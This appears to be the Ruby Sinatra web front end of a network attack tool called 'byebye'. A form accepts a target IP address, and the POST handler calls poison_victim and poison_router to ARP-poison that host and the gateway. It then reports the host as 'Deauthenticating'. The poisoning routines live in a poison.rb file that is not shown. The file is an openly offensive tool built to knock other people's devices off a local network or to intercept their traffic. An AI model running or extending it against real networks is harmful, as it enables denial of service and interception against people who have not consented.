#!/usr/bin/env ruby
require 'rubygems' if RUBY_VERSION < "1.9"

require 'sinatra/base'
require 'sinatra/reloader'
require 'erb'

require_relative 'poison.rb'

##############################################
# web.rb
#   Execute byebye web service!
##############################################


class ByeApp < Sinatra::Base
    
  # Configure and register reloader to reload on changes
  configure :development do
    set :logging, false
    set :public_folder, File.dirname(__FILE__) + '/views'
    register Sinatra::Reloader
  end
  
  before do
    @iface = settings.iface.to_s
    @mac = settings.mac.to_s
    @gateway_ip = settings.gateway_ip.to_s
    @gateway_mac = settings.gateway_mac.to_s
  end

  # Default / path
  get '/' do    
    Socket.do_not_reverse_lookup = false
    @head = "Welcome to byebye, #{Socket.gethostname}!"
    erb :index
  end
  
  post '/' do
    address = "#{params['ip']}".chomp
    
    # TODO: Fix ArgumentError
    poison_victim(@iface, @mac, @gateway_ip, address)
    poison_router(@iface, @mac, @gateway_ip, @gateway_mac, address)
    
    @deauth_text = "Deauthenticating #{address}"
    erb :index
  end
  
end
